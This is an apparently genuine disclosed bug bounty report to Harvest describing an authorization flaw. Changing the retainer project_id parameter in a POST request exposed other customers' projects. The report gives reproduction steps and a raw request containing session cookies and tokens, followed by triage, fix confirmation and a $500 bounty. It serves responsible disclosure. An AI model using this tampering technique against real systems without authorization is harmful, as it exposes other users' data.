{"id":152929,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTI5Mjk=","url":"https://hackerone.com/reports/152929","title":"Project Disclosure of all Harvest Instances","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-07-21T15:06:32.538Z","submitted_at":"2016-07-21T15:06:32.538Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"vichaarya","url":"/vichaarya","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/LHfTZJ2aXQwVUL6tvLA9n7fj/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":237,"url":"https://hackerone.com/harvest","handle":"harvest","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Harvest","twitter_handle":"","website":"http://getharvest.com","about":"Harvest is a leader in online time tracking and invoicing. Work better, and make smarter decisions for your business."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-11-01T23:18:18.019Z","bug_reporter_agreed_on_going_public_at":"2016-10-02T23:18:10.637Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nThe POST request to create new Retainer in admin panel can use and disclose all the projects in @harvest not just available in admin's @harvest instance.\n\n__Steps to Reproduce:__\n1. Login to application using admin credentials and traverse to Invoices \u003e Retainers \u003e + New Retainers\n2. Select valid Client and Project and click on Create Retainer\n3. Intercept the request and change the ```retainer[project_id]``` POST parameter value to any other project ID (Example: 11310690)\n4. Observe the mapped project in resulting page (which is not of the user's) \n\n__Request:__\n```\nPOST /retainers HTTP/1.1\nHost: kalki.harvestapp.com\nConnection: close\nContent-Length: 200\nCache-Control: max-age=0\nOrigin: https://kalki.harvestapp.com\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: https://kalki.harvestapp.com/retainers\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.8\nCookie: __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; removed_from_remarketing=true; production_access_token=c25JenRIcEJ4MHdOL08wa1VaL0paTURlcUdqZjZpUnlxZHVaYUJxSDZSektHYlVkOXlYS3JBMG5FQjVsbWJKSHpBOW1Cd3dBWjNsQkRITDlwNUlFVXlZTG1PM3IwS20xZjRCTnlhMFIvZktwdWhXU0l1QnZUWkJDUnRJUmRJZjJHVlRoakRrK2J2QmkxUmUvekN5U253PT0tLW5zUTV4Z3JpNkhCeGdMczk3WnUrNVE9PQ%3D%3D--c6f2aa80cba2531fb74f3c964ebb98f94284dacd; tab=projects; _gat_UA-103886-9=1; _harvest_sess=VE1ENjJJdWJNMTFaQ05XRU5VeS9odFdjYlNvekpkNU9SSWo2OGNKaXVPempNOTd5Vk1jYVo5ZC9Fa1RydzRxVHJTTXV4ejFUeHpMSG5VVXBiQTl6ZG5Qb2kwUXc1QXpmUU5OMjlhVk9zdndOTVFxd01PSWJXeHJLR3RhbmFtQzVwOEdtUXQ1djNWaytZYS83Q2xKZDA2MC9GQ3ZJbGwwMVluTHp5WWRzTWZISC9KelRSTnpsNUViRXliMThFYU5ldFJkY2w5TjhBMmZodVIxblU4TjdIR3NDK3Q5RXNzRUtjb1FvU0RKeDlTTTQxN1RiN3BVLy9RVGF5SUxrTzUvYlVXWjRaZy9zMmhnTVEzY0djQjF3R0x1K0o5ZlF1SURISjRCN0NiMmVwYXRyem43UHVpRG1adnl6aFo4cXZNU1BnZk1NS28yc0ppeDJ4ZHpyZDF3MkVnPT0tLWl3cExZMTY5QTI2R2sramlUSkZsbmc9PQ%3D%3D--fdf23974636360066904b23490cee4aaa8af998a; __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; _ga=GA1.3.248343812.1469015568\n\nutf8=%E2%9C%93\u0026authenticity_token=2sMNTZOgzHB08ikQe5W%2FQVIJlH%2Bhr5tUKNJtLELNQ%2FCMteRK%2FmAU8MGBORxzjWJPUbaovG0yVqAqZ5KFi0uVWg%3D%3D\u0026retainer%5Bclient_id%5D=4679616\u0026retainer%5Bproject_id%5D=11310690\n```\n\n","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003cp\u003eThe POST request to create new Retainer in admin panel can use and disclose all the projects in \u003ca href=\"/harvest\"\u003e@harvest\u003c/a\u003e not just available in admin\u0026#39;s \u003ca href=\"/harvest\"\u003e@harvest\u003c/a\u003e instance.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eSteps to Reproduce:\u003c/strong\u003e\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eLogin to application using admin credentials and traverse to Invoices \u0026gt; Retainers \u0026gt; + New Retainers\u003c/li\u003e\n\u003cli\u003eSelect valid Client and Project and click on Create Retainer\u003c/li\u003e\n\u003cli\u003eIntercept the request and change the \u003ccode\u003eretainer[project_id]\u003c/code\u003e POST parameter value to any other project ID (Example: 11310690)\u003c/li\u003e\n\u003cli\u003eObserve the mapped project in resulting page (which is not of the user\u0026#39;s) \u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eRequest:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /retainers HTTP/1.1\nHost: kalki.harvestapp.com\nConnection: close\nContent-Length: 200\nCache-Control: max-age=0\nOrigin: https://kalki.harvestapp.com\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: https://kalki.harvestapp.com/retainers\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.8\nCookie: __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; removed_from_remarketing=true; production_access_token=c25JenRIcEJ4MHdOL08wa1VaL0paTURlcUdqZjZpUnlxZHVaYUJxSDZSektHYlVkOXlYS3JBMG5FQjVsbWJKSHpBOW1Cd3dBWjNsQkRITDlwNUlFVXlZTG1PM3IwS20xZjRCTnlhMFIvZktwdWhXU0l1QnZUWkJDUnRJUmRJZjJHVlRoakRrK2J2QmkxUmUvekN5U253PT0tLW5zUTV4Z3JpNkhCeGdMczk3WnUrNVE9PQ%3D%3D--c6f2aa80cba2531fb74f3c964ebb98f94284dacd; tab=projects; _gat_UA-103886-9=1; _harvest_sess=VE1ENjJJdWJNMTFaQ05XRU5VeS9odFdjYlNvekpkNU9SSWo2OGNKaXVPempNOTd5Vk1jYVo5ZC9Fa1RydzRxVHJTTXV4ejFUeHpMSG5VVXBiQTl6ZG5Qb2kwUXc1QXpmUU5OMjlhVk9zdndOTVFxd01PSWJXeHJLR3RhbmFtQzVwOEdtUXQ1djNWaytZYS83Q2xKZDA2MC9GQ3ZJbGwwMVluTHp5WWRzTWZISC9KelRSTnpsNUViRXliMThFYU5ldFJkY2w5TjhBMmZodVIxblU4TjdIR3NDK3Q5RXNzRUtjb1FvU0RKeDlTTTQxN1RiN3BVLy9RVGF5SUxrTzUvYlVXWjRaZy9zMmhnTVEzY0djQjF3R0x1K0o5ZlF1SURISjRCN0NiMmVwYXRyem43UHVpRG1adnl6aFo4cXZNU1BnZk1NS28yc0ppeDJ4ZHpyZDF3MkVnPT0tLWl3cExZMTY5QTI2R2sramlUSkZsbmc9PQ%3D%3D--fdf23974636360066904b23490cee4aaa8af998a; __utma=; __utmb=; __utmc=; __utmx=; __utmz=; __utmv=; __utmk=; _ga=GA1.3.248343812.1469015568\n\nutf8=%E2%9C%93\u0026amp;authenticity_token=2sMNTZOgzHB08ikQe5W%2FQVIJlH%2Bhr5tUKNJtLELNQ%2FCMteRK%2FmAU8MGBORxzjWJPUbaovG0yVqAqZ5KFi0uVWg%3D%3D\u0026amp;retainer%5Bclient_id%5D=4679616\u0026amp;retainer%5Bproject_id%5D=11310690\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":27,"name":"Improper Authentication - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":106407,"file_name":"harvest_Project_Disclosure_of_all_Harvest_Instances.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/106/407/168f2d2e233b217f874d50277cd825cae1d14952/harvest_Project_Disclosure_of_all_Harvest_Instances.png?response-content-disposition=attachment%3B%20filename%3D%22harvest_Project_Disclosure_of_all_Harvest_Instances.png%22%3B%20filename%2A%3DUTF-8%27%27harvest_Project_Disclosure_of_all_Harvest_Instances.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSC5UFWXL%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T043406Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCwK%2B%2BlMufFx2twThN55FpWvSNFMRcTw6DIMXMwu3SRJgIgbfhKiC5W8N8YFQB0Nj1%2Boe6pAlr8Ti%2FvGEEHHH13JNkqtAMIUxABGgwwMTM2MTkyNzQ4NDkiDKRKppBQcflzJsWylyqRAzVMKZ6jWFrSD2Y9kWok2waN0zNoEyuNoms1kUC37gd2cWniMYOCGZa9pHJ%2BTGOcJDE8mr7X3wJV03PeWNx%2FJ3x1t1adSeplF3kKkxVzwMpsJiOYMPMNaXbK6aN%2FVxaTTjwIHJMTw7ej%2BNad1lrBkNYM8xmTFPzJdlIn3krUMQVcm66POZCl3IpgIriUdvRQsdjWZjnf%2FUXejEcDwlys5fmmpAap4FXWkuE4xPD5JITrqd71Zc4guVr49IYqaJ9P8ZOa39l8Cm9yOfvHOdc%2FHHkeb3dhc64lVpxLQxnIzdRkUBVcVDfLrNaCOxpa9K0SDMt9HK%2B6%2F6SozxEKFb7iD2%2BQkM42Rwtm3vBMeKEUDeFG3yO5gW6KJtirosz7Y3m8DdEylt%2F8air6KKuH0wjD%2B9LfO7%2FWKZCn3h7tRVYtr71OXTcV4jMC7Q6El1VpYoy1%2FUyJLt0VlyMhH1u00hOd2Ed613mjv9Lq0b8iTU4W3vlCcM%2FtjGgBfI2lPMbp3cacOsLTQtiqUw%2FMXKZM7aikuuh%2BML6aqv8FOusBAaUZsZRvtcfsxqJAwQO39V21wLoeubOAIV%2BtvLyfXzwltZABeAGkBPYy8xl5ryQb8Y%2BKG%2FfwUfCGsCxtOppNqsZCDg0JzwPVO8CdiGO1QqRKJpkb23agNpWEIAa8FY4BpDjQUZHUIl4jWVfFWH2sizzpICjQxnSI3JQpi2%2B9GAdI3gAmweVyhKgicRGn9QyAfoRtqO3YWntGA8EeCXAhyWW%2BxebF5JNSGoYhvM72O00zG1YKAYz%2F6ymrbrJmLpZ0WbBqG4d2%2BRi9F0TVfiKq0rdWihYUV%2FstwlGLcPIVuYIDnBH4oA5HYk7pFw%3D%3D\u0026X-Amz-Signature=ee594b67d8187f2e5179320f459c76859f5975ef8e4b1a70d686ba88ae439eb2","file_size":144588,"type":"image/png"}],"allow_singular_disclosure_at":"2016-11-01T23:18:10.694Z","allow_singular_disclosure_after":-131174155.38021663,"singular_disclosure_allowed":true,"vote_count":8,"voters":["0xsyndr0me","madrobot","vichaarya","spetr0x","test-123","rey_7","dyabla","harrykun18"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1091253,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi Vathsa,\n\nThanks a lot for your report! \nLooks like you might found something, I'll triage the report while investigating and we will contact you as soon as we can.\n\nPlease let us know if you find anything else!\n\nBest regards,\nJorge","markdown_message":"\u003cp\u003eHi Vathsa,\u003c/p\u003e\n\n\u003cp\u003eThanks a lot for your report! \u003cbr\u003e\nLooks like you might found something, I\u0026#39;ll triage the report while investigating and we will contact you as soon as we can.\u003c/p\u003e\n\n\u003cp\u003ePlease let us know if you find anything else!\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-07-27T17:46:39.307Z","updated_at":"2016-07-27T17:46:39.307Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1184803,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi vagg-a-bond,\n\nThis one should be fixed now. \nCould you check if you are able to reproduce it now?\n\nThanks!\nJorge","markdown_message":"\u003cp\u003eHi vagg-a-bond,\u003c/p\u003e\n\n\u003cp\u003eThis one should be fixed now. \u003cbr\u003e\nCould you check if you are able to reproduce it now?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003cbr\u003e\nJorge\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-09T15:35:29.734Z","updated_at":"2016-09-09T15:35:29.734Z","actor":{"username":"jorgeleria","cleared":false,"url":"/jorgeleria","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/680/84ed9b9afaf2905ae339b479cf97d7161fd1ae64_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"vichaarya","url":"/vichaarya"},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1196371,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Confirmed the fix. ","markdown_message":"\u003cp\u003eConfirmed the fix. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-15T14:10:54.025Z","updated_at":"2016-09-15T14:10:54.025Z","actor":{"username":"vichaarya","cleared":false,"url":"/vichaarya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LHfTZJ2aXQwVUL6tvLA9n7fj/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1206402,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update on bounty for this issue ?","markdown_message":"\u003cp\u003eAny update on bounty for this issue ?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-20T10:05:16.735Z","updated_at":"2016-09-20T10:05:16.735Z","actor":{"username":"vichaarya","cleared":false,"url":"/vichaarya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LHfTZJ2aXQwVUL6tvLA9n7fj/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1223793,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping make Harvest more secure!","markdown_message":"\u003cp\u003eThanks for helping make Harvest more secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-29T15:39:52.904Z","updated_at":"2016-09-29T15:39:52.904Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"harvest","collaborator":{"username":"vichaarya","url":"/vichaarya"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1228425,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-10-02T23:18:10.659Z","updated_at":"2016-10-02T23:18:10.659Z","first_to_agree":true,"actor":{"username":"vichaarya","cleared":false,"url":"/vichaarya","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/LHfTZJ2aXQwVUL6tvLA9n7fj/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1279501,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-11-01T23:18:18.040Z","updated_at":"2016-11-01T23:18:18.040Z","actor":{"url":"/harvest","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/237/ce650f9fba222040127528a7c95dab237f8a9734_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Harvest"}},"genius_execution_id":null,"team_handle":"harvest","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}